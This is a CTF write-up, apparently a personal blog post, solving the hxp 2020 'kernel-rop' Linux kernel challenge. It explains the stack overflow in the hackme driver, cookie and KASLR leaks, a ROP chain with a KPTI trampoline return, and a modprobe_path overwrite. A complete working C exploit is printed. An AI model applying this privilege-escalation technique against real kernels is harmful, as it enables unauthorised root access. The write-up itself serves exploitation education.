---
layout: post
title: "Kernel ROP hxp ctf 2020"
categories: Pwn Kernel
tags: Hacking Pwn
---
##Kernel ROP, the 'starting point' of kernel pwn

The first week of October 2023 I had the amazing opportunity to take part to Andrey Konovalov's Training ("Attacking the Linux Kernel") thanks to hexacon organizers... 

When I returned home I played some ctf challenge involving kernel exploitation but I didn't have enough time to write a blog on them because of uni...
If someone have ever searched linux kernel exploitation most of the blogposts speak about this chall  (kernel-rop hxp CTF 2020)

<!--excerpt-->

# Reconnaissance
The most important file that we get ([download here)](https://2020.ctf.link/assets/files/kernel-rop-bf9c106d45917343.tar.xz) are vmlinuz, run.sh , and initramfs.cpio.gz

 1. vmlinuz , is the compressed linux kernel, we will use it to get kROP gadgets, and to debug
 2. run.sh the script that make qemu run the kernel, we can see from here the various protections...
 3. initramfs.cpio.gz linux file system, contains the basic directory such as /bin and also contains the vulnerable driver
 
 The run.sh file contains :

     #!/bin/sh
    qemu-system-x86_64 \
        -m 128M \
        -cpu kvm64,+smep,+smap \
        -kernel vmlinuz \
        -initrd initramfs.cpio.gz \
        -hdb flag.txt \
        -snapshot \
        -nographic \
        -monitor /dev/null \
        -no-reboot \
        -append "console=ttyS0 kaslr kpti=1 quiet panic=1"
We can see the various protections: `smep` and `smap` respectively the 20th and 21th bit of CR4 control register (in older kernel we could modify it to disable them), in practice they act like NX in userspace, SMEP marks userland pages as non-executable, SMAP complements SMEP by making them also non readable/writable when process is in kernel mode.
There is also `kaslr` it acts like aslr in userland, it randomizes the base address where the kernel is loaded each time the system is booted.
There is also `kpti`, originally created to prevents attack like meltdown it separates kernel pages from userland pages

Knowing the protections we have to deal with  let's get our hands dirty and start analyzing the kernel module, we can extract it from  initramfs.cpio.gz with these commands:
```bash
gunzip ./initramfs.cpio.gz
cpio -idm < ./initramfs.cpio
```
The two important functions are hackme_write and hackme_read.

    00000040  int64_t hackme_write()
    
    00000040      int64_t rdx_2 //size
    00000040      int64_t rsi_2
    00000040      rdx_2, rsi_2 = __fentry__()
    00000056      void* gsbase
    00000056      int64_t rax = *(gsbase + 0x28) //kernel stack cookie
    0000006c      if (rdx_2 u> 0x1000)
    000000d9          __warn_printk(0x240, 0x1000)
    000000de          trap(6)
    0000007d      __check_object_size(0x8c0, rdx_2, 0)
    00000097      int64_t rax_3
    00000097      if (_copy_from_user(0x8c0, rsi_2, rdx_2) != 0)
    000000ee          rax_3 = -0xe
    000000aa      else
    000000aa          void var_a0
    000000aa          __memcpy(&var_a0, 0x8c0, rdx_2)
    000000af          rax_3 = rdx_2
    000000bf      if (rax != *(gsbase + 0x28))
    000000e9          __stack_chk_fail()
    000000e9          noreturn
    000000cc      return rax_3  {"Buffer overflow detected (%d < %…"}

    00000110  int64_t hackme_read()
    
    00000110      int64_t rdx_2
    00000110      int64_t rsi_2
    00000110      rdx_2, rsi_2 = __fentry__()
    00000137      void* gsbase
    00000137      int64_t rax = *(gsbase + 0x28) // kernel stack cookie
    00000146      void var_a0
    00000146      __memcpy(0x8c0, &var_a0)
    00000152      if (rdx_2 u> 0x1000)
    000001b2          __warn_printk(0x240, 0x1000, rdx_2)
    000001b7          trap(6)
    00000163      __check_object_size(0x8c0, rdx_2, 1)
    0000017d      int64_t rax_3 = -0xe
    00000184      if (_copy_to_user(rsi_2, 0x8c0, rdx_2) == 0)
    00000184          rax_3 = rdx_2
    00000195      if (rax != *(gsbase + 0x28))
    000001c2          __stack_chk_fail()
    000001c2          noreturn
    000001a2      return rax_3  {"Buffer overflow detected (%d < %…"}

The vulnerabilities are trivial we can read and write to kernel stack, the buffer length is 0x80, but if we send more than 0x1000 bytes it will return "Buffer Overflow detected"...., in hackme_write "_copy_from_user" is used and that's the vulnerable function to make the overflow.
Now let's get the ROP gadgets, we need to extract vmlinux from vmlinux we need to use [extract-vmlinux](https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux) then we will use ROPgdaget

    ./extract-vmlinux vmlinuz > vmlinux
    chmod +x vmlinux
    ROPgadget --binary=vmlinux > gadgets.txt

The vmlinux has like **THOUSANDS**  gadgets, i mean is the kernel image so it will run for several minutes, that's why we save them in a file for easy reference.

    ls -lah gadgets.txt 
    -rw-rw-r-- 1 ctf ctf 46M nov 18 16:01 gadgets.txt

# LEAKING STUFF
Now it's time to write some c code (warning: shitty c code coming!), there are no IOCTL so we will use read() and write() directly on the driver!
First let's open it
```c
int fd;

int main(){
        fd = open("/dev/hackme", O_RDWR);
        if (fd < 0){ 
                printf("Device Not Opened\n");
                return -1;
        }
        printf("[+] Stage 0: Device Opened!\n");
        return 0;
}
```
As we saw earlier there is kaslr so we need to leak some stuff in this case Kernel Base Address and Kernel Stack Cookie...
```c
        for (int i=1; i<=50; i++){
                unsigned long leak[i];
                ssize_t l = read(fd, leak, sizeof(leak));
                for (int j=0;j<i;j++){
                        printf("Cycle: %d Idx: %d Element: %lx\n",i,j,leak[j]);
                }
        }
 ```
 
 As result we get from last cycle

    Cycle: 50 Idx: 0 Element: ffffffffa4ae21d0
    Cycle: 50 Idx: 1 Element: 1f
    Cycle: 50 Idx: 2 Element: 184ded5d1f441700
    Cycle: 50 Idx: 3 Element: ffff931a06ca3f10
    Cycle: 50 Idx: 4 Element: ffffa272c01bfe68
    Cycle: 50 Idx: 5 Element: 4
    Cycle: 50 Idx: 6 Element: ffff931a06ca3f00
    Cycle: 50 Idx: 7 Element: ffffa272c01bfef0
    Cycle: 50 Idx: 8 Element: ffff931a06ca3f00
    Cycle: 50 Idx: 9 Element: ffffa272c01bfe80
    Cycle: 50 Idx: 10 Element: ffffffffa4f945e7
    Cycle: 50 Idx: 11 Element: ffffffffa4f945e7
    Cycle: 50 Idx: 12 Element: ffff931a06ca3f00
    Cycle: 50 Idx: 13 Element: 0
    Cycle: 50 Idx: 14 Element: 7ffe7e120030
    Cycle: 50 Idx: 15 Element: ffffa272c01bfea0
    Cycle: 50 Idx: 16 Element: 184ded5d1f441700
    Cycle: 50 Idx: 17 Element: 190
    Cycle: 50 Idx: 18 Element: 0
    Cycle: 50 Idx: 19 Element: ffffa272c01bfed8
    Cycle: 50 Idx: 20 Element: ffffffffa4bd2c7f
    Cycle: 50 Idx: 21 Element: ffff931a06ca3f00
    Cycle: 50 Idx: 22 Element: ffff931a06ca3f00
    Cycle: 50 Idx: 23 Element: 7ffe7e120030
    Cycle: 50 Idx: 24 Element: 190
    Cycle: 50 Idx: 25 Element: 0
    Cycle: 50 Idx: 26 Element: ffffa272c01bff20
    Cycle: 50 Idx: 27 Element: ffffffffa4816717
    Cycle: 50 Idx: 28 Element: ffffffffa4801a31
    Cycle: 50 Idx: 29 Element: 0
    Cycle: 50 Idx: 30 Element: 184ded5d1f441700
    Cycle: 50 Idx: 31 Element: ffffa272c01bff58
    Cycle: 50 Idx: 32 Element: 0
    Cycle: 50 Idx: 33 Element: 0
    Cycle: 50 Idx: 34 Element: 0
    Cycle: 50 Idx: 35 Element: ffffa272c01bff30
    Cycle: 50 Idx: 36 Element: ffffffffa4a4ce5a
    Cycle: 50 Idx: 37 Element: ffffa272c01bff48
    Cycle: 50 Idx: 38 Element: ffffffffa440a157
    Cycle: 50 Idx: 39 Element: 0
    Cycle: 50 Idx: 40 Element: 0
    Cycle: 50 Idx: 41 Element: ffffffffa460008c
    Cycle: 50 Idx: 42 Element: 0
    Cycle: 50 Idx: 43 Element: 32
    Cycle: 50 Idx: 44 Element: 0
    Cycle: 50 Idx: 45 Element: 32
    Cycle: 50 Idx: 46 Element: 7ffe7e120220
    Cycle: 50 Idx: 47 Element: 7ffe7e1201c0
    Cycle: 50 Idx: 48 Element: 246
    Cycle: 50 Idx: 49 Element: 10

We can easily identify the Kernel Stack Cookie in various Position (like idx:16), for kernel base is quite tricky, checking on gdb the address we see that the address at idx: 38 is:

    Mapped Area 0xffffffffa440a157 = 0xffffffffa4400000 + 0xa157

We got really close to the base, so our c code now is like this:
```c
        unsigned long leak[40];
        unsigned long cookie;
        unsigned long kbase;
        ssize_t l = read(fd, leak, sizeof(leak));
        cookie = leak[16];
        kbase = leak[38]  - 0xa157ULL;
        printf("Cookie: %lx\n", cookie);
        printf("Kernel Base: %lx\n", kbase);
```
Running it we get:

    / $ ./exploit 
    [+] Stage 0: Device Opened!
    Cookie: ff5d094528d80700
    Kernel Base: ffffffffb2200000

# OVERFLOW? and MORE LEAK! 
So we leaked kernel base and stack cookie, now let's control the rip, again as before I tried a bruteforce approach:
```c
	for (int i=1; i<=50;i++){
		unsigned long payload[i];
		ssize_t w = write(fd, payload, sizeof(payload));
		printf("Cycle: %d\n",i);
	}
```
Running it we get

    / $ ./exploit 
    [+] Stage 0: Device Opened!
    Cookie: 8ec78658c974d100
    Kernel Base: ffffffff9ee00000
    Cycle: 1
    Cycle: 2
    Cycle: 3
    Cycle: 4
    Cycle: 5
    Cycle: 6
    Cycle: 7
    Cycle: 8
    Cycle: 9
    Cycle: 10
    Cycle: 11
    Cycle: 12
    Cycle: 13
    Cycle: 14
    Cycle: 15
    Cycle: 16
    [    6.801678] Kernel panic: not syncing: stack-protector: Kernel stack is corrupted in: hackme_write+0xae/0xc0 [hackme]
    [    6.802456] CPU: 0 PID: 113 Comm: exploit Tainted: G           O      5.9.0-rc6+ #10
    [    6.802873] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
    [    6.804158] Call Trace:
    [    6.804875]  dump_stack+0x74/0x9f
    [    6.805194]  panic+0xfe/0x2ed
    [    6.806449]  ? hackme_write+0xae/0xc0 [hackme]
    [    6.806703]  __stack_chk_fail+0x14/0x20
    [    6.806923]  hackme_write+0xae/0xc0 [hackme]
    [    6.807116]  vfs_write+0xc2/0x1c0
    [    6.807362]  ksys_write+0xa7/0xe0
    [    6.807551]  ? exit_to_user_mode_prepare+0x31/0x180
    [    6.807757]  __x64_sys_write+0x1a/0x20
    [    6.807940]  do_syscall_64+0x37/0x80
    [    6.808892]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
    [    6.809250] RIP: 0033:0x44f4d7
    [    6.809483] Code: ff ff f7 d8 64 89 02 48 c7 c0 ff ff ff ff eb b7 0f 1f 00 f3 0f 1e fa 64 8b 04 25 18 00 00 00 85 c0 74
    [    6.810219] RSP: 002b:00007ffc98aa2588 EFLAGS: 00000246 ORIG_RAX: 0000000000000001
    [    6.810585] RAX: ffffffffffffffda RBX: 00007ffc98aa2620 RCX: 000000000044f4d7
    [    6.810920] RDX: 0000000000000088 RSI: 00007ffc98aa2590 RDI: 0000000000000003
    [    6.811264] RBP: 00007ffc98aa27e0 R08: 0000000000000000 R09: 0000000000000000
    [    6.812582] R10: 000000000000000a R11: 0000000000000246 R12: 0000000000000011
    [    6.813008] R13: 0000000000000000 R14: 0000000000000011 R15: 0000000000000000
    [    6.813961] Kernel Offset: 0x1de00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
    [    6.816946] Rebooting in 1 seconds..
	
So we know the offset is 16, cool but know the interesting part!
Our exploit became:

    int n = 50;
    int off= 16;
    unsigned long payload[n];
    payload[off++] = cookie; //kernel cookie pops these 3 registers not just rbp like userland
    payload[off++] = 0x0; // rbx
    payload[off++] = 0x0; // r12
    payload[off++] = 0x0; // rbp
    ssize_t w = write(fd, payload, sizeof(payload));

The real objective in a kernel challenge is escalate the privilege to root!
There are various techniques to became root the one I will use is called modprobe_path overwrite...
What is `modprobe`?  In short words is a program that will be executed when we install/remove new modules, is a kernel global variables defined in `/proc/kallsyms` (where all kernel symbols exported lies) and the base path is `/sbin/modprobe`, we will overwrite it to execute a malicious payload.
Let's check /proc/kallsyms:

    / $ cat /proc/kallsyms |head
    cat: can't open '/proc/kallsyms': Permission denied

We need to tweak our initramfs, there is a script in initramfs/etc/   called inittab that is the responsible from spawning us a user shell:

    : sysinit:/etc/init.d/rcS
    : once:-sh -c 'cat /etc/motd; setuidgid 1000 sh; poweroff'

We modify it (remember to revert it when testing final exploit!!!), to get us a root shell!

    : sysinit:/etc/init.d/rcS
    : once:-sh -c 'cat /etc/motd; setuidgid 0 sh; poweroff'

We can see if it worked when we execute run.sh we get

    / # id
    uid=0 gid=0 groups=0

Now let's grep the interesting symbols...

    / # cat /proc/kallsyms | grep modprobe_path
    ffffffffa2c61820 D modprobe_path
    / # cat /proc/kallsyms | grep swapgs_restore_regs_and_return_to_usermode
    ffffffffa1e00f10 T swapgs_restore_regs_and_return_to_usermode

The last one is the function we will use to bypass kpti...
Those addresses are also randomized, so we need to leak kernel base and subtract it from those addresses to get their offsets...

    Kernel Base: ffffffffa1c00000 //running our exploit

So we add those lines:

    unsigned long modprobe = kbase + 0x1061820UL;
    unsigned long swapgs_restore = kbase + 0x200f10UL +22;

If you are asking why the +22 in the trampoline function here is the explanation:

    / # cat /proc/kallsyms |grep swapgs_restore_regs_and_return_to_usermode
    ffffffff98000f10 T swapgs_restore_regs_and_return_to_usermode
    
    pwndbg> x/15i 0xffffffff98000f10
       0xffffffff98000f10:	pop    r15 \
       0xffffffff98000f12:	pop    r14 |
       0xffffffff98000f14:	pop    r13 |
       0xffffffff98000f16:	pop    r12 |
       0xffffffff98000f18:	pop    rbp |
       0xffffffff98000f19:	pop    rbx |
       0xffffffff98000f1a:	pop    r11 |
       0xffffffff98000f1c:	pop    r10 | <- SKIP THOSE!
       0xffffffff98000f1e:	pop    r9  |
       0xffffffff98000f20:	pop    r8  |
       0xffffffff98000f22:	pop    rax |
       0xffffffff98000f23:	pop    rcx |
       0xffffffff98000f24:	pop    rdx |
       0xffffffff98000f25:	pop    rsi /
       0xffffffff98000f26:	mov    rdi,rsp <- jump here

We can skip all that pop jumping directly at `mov rdi, rsp` instruction.
Now let's get the rop gadgets, we must assume thay kernel base is 0xffffffff81000000

    $ cat gadgets.txt |grep ": pop rax ; ret"
    0xffffffff81004d11 : pop rax ; ret

    $ cat gadgets.txt |grep ": pop rbx ; ret"
    0xffffffff81006158 : pop rbx ; ret

We also need a gadget like this

    0xffffffff8100306d : mov qword ptr [rbx], rax ; pop rbx ; pop rbp ; ret

# _R00T_
So far we have leaked kernel stack cookie, kernel base address, rop gadgets, functions... and we know the offset to overwrite rip register.

Now let's make our payload, we left it in this state:

    int n = 50;
    int off= 16;
    unsigned long payload[n];
    payload[off++] = cookie; //kernel cookie pops these 3 registers not just rbp like userland
    payload[off++] = 0x0; // rbx
    payload[off++] = 0x0; // r12
    payload[off++] = 0x0; // rbp
We will update it in:

    payload[off++] = cookie; //kernel cookie pops these 3 registers not just rbp like userland
    payload[off++] = 0x0; // rbx
    payload[off++] = 0x0; // r12
    payload[off++] = 0x0; // rbp
    payload[off++] = pop_rax;
    payload[off++] = 0x6d2f706d742f // /tmp/m (https://gchq.github.io/CyberChef/#recipe=To_Hex('None',0)&input=bS9wbX>
    payload[off++] = pop_rbx;
    payload[off++] = modprobe;
    payload[off++] = mov_rbx_rax;
    payload[off++] = 0x0; // pop rbx
    payload[off++] = 0x0; // pop rbp

So far we have overwritten modprobe_path to /tmp/m, but what is /tmp/m?
/tmp/m will be our malicious payload to become root, when we return to userland, in this case we will read the flag stored in /dev/sda.
Then we create /tmp/dummy that contains 4 \xff bytes for the header, when executed the kernel will call modprobe_path, but in reality it will execute /tmp/m because we overwrote it. Translating it in c:
```c
void get_root(void){
        system("echo '#!/bin/sh\ncp /dev/sda /tmp/flag\nchmod 777 /tmp/flag' > /tmp/m");
        system("chmod +x /tmp/m");
        system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
        system("chmod +x /tmp/dummy");
        system("/tmp/dummy");
        system("cat /tmp/flag");
        exit(0);
}
```

Speaking of we need to return userland from kernel mode, and we can't point to address of a win function. We need to save the state our register before we enter in kernel land, and restore them just after getting root.

```c
unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}
```

The final exploit code is:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

void get_root(void){
	system("echo '#!/bin/sh\ncp /dev/sda /tmp/flag\nchmod 777 /tmp/flag' > /tmp/m");
	system("chmod +x /tmp/m");
	system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
	system("chmod +x /tmp/dummy");
	system("/tmp/dummy");
	system("cat /tmp/flag");
	exit(0);
}

int fd;

int main(){
	save_state();
	fd = open("/dev/hackme", O_RDWR);
	if (fd < 0){
		printf("Device Not Opened\n");
		return -1;
	}
	printf("[+] Stage 0: Device Opened!\n");
	/*
	for (int i=1; i<=50; i++){
		unsigned long leak[i];
		ssize_t l = read(fd, leak, sizeof(leak));
		for (int j=0;j<i;j++){
			printf("Cycle: %d Idx: %d Element: %lx\n",i,j,leak[j]);
		}
	}
	*/
	unsigned long leak[40];
	unsigned long cookie;
	unsigned long kbase;
	ssize_t l = read(fd, leak, sizeof(leak));
	cookie = leak[16];
	kbase = leak[38]  - 0xa157ULL;
	printf("Cookie: %lx\n", cookie);
	printf("Kernel Base: %lx\n", kbase);

	/*
	for (int i=1; i<=50;i++){
		unsigned long payload[i];
		ssize_t w = write(fd, payload, sizeof(payload));
		printf("Cycle: %d\n",i);
	}
	*/
	unsigned long modprobe = kbase + 0x1061820UL;
	unsigned long swapgs_restore = kbase + 0x200f10UL +22;
	unsigned long pop_rax = kbase + 0x4d11UL;
	unsigned long pop_rbx = kbase + 0x6158UL;
	unsigned long mov_rbx_rax = kbase + 0x306dUL;
	int n = 50;
	int off= 16;
	unsigned long payload[n];
	payload[off++] = cookie; //kernel cookie pops these 3 registers not just rbp like userland
	payload[off++] = 0x0; // rbx
	payload[off++] = 0x0; // r12
	payload[off++] = 0x0; // rbp
	payload[off++] = pop_rax;
	payload[off++] = 0x6d2f706d742f; // /tmp/m (https://gchq.github.io/CyberChef/#recipe=To_Hex('None',0)&input=bS9wbXQv)
	payload[off++] = pop_rbx;
	payload[off++] = modprobe;
	payload[off++] = mov_rbx_rax;
	payload[off++] = 0x0; // pop rbx
	payload[off++] = 0x0; // pop rbp
	payload[off++] = swapgs_restore;
	payload[off++] = 0x0; // pop rax
	payload[off++] = 0x0; // pop rdi
	payload[off++] = (unsigned long)get_root; // we return to userland
	payload[off++] = user_cs;  //        WE RESTORE
	payload[off++] = user_rflags; //     HERE THE
	payload[off++] = user_sp; //         USERLAND
	payload[off++] = user_ss; //         STATE
	ssize_t w = write(fd, payload, sizeof(payload));
	printf("\n[-] This printf should not be reached!\n");
	return 0;
}
```

Running it we get:

    / $ ./exploit 
    [+] Stage 0: Device Opened!
    Cookie: 40905ebdc7ffef00
    Kernel Base: ffffffffbd400000
    /tmp/dummy: line 1: ����: not found
    hxp{t0p_d3feNSeS_Vs_1337_h@ck3rs} 

And for today it's all! In the next week I'll try to write other posts about kernel exploitation challenges.
